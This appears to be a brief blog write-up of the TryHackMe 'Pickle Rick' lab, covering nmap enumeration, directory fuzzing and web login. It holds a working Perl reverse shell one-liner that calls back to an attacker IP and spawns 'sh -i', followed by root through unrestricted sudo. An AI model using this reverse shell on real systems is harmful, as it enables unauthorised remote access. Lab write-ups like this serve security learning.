---
title: TryHackMe | Pickle Rick
author: Zeropio
date: 2022-05-09
categories: [TryHackMe, Rooms]
tags: [thm, linux]
permalink: /tryhackme/pickle-rick
---


# Enumeration
We start a nmap at the IP.
```
Nmap scan report for 10.10.253.214
Host is up (0.067s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f8:50:7b:e1:4c:53:63:5d:2b:c6:84:1a:66:e9:a0:04 (RSA)
|   256 19:a8:de:3e:70:d9:ba:ff:d5:2f:46:60:a2:e1:c3:e3 (ECDSA)
|_  256 70:de:54:34:34:75:c3:77:56:9e:00:b3:84:93:fe:97 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can do a curl to the webpage and get a user in the html:
```console
curl -i http://10.10.253.214/
```

We can try a fuzzer to the webpage:
```console
dirsearch -r -u http://10.10.253.214/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -e php,txt,html -f
```

# Explotation
We can try to access with ssh but we need the RSA.

We can get a **login.php** and access with the creds. We can see a command execution and try a reverse shell with perl:
```console
perl -e 'use Socket;$i="10.18.91.218";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

# Privilege Escalation
If we list all the www-data privileges we can see that we can executed any code, so we can get root.
```console
> sudo -l
> sudo su
```
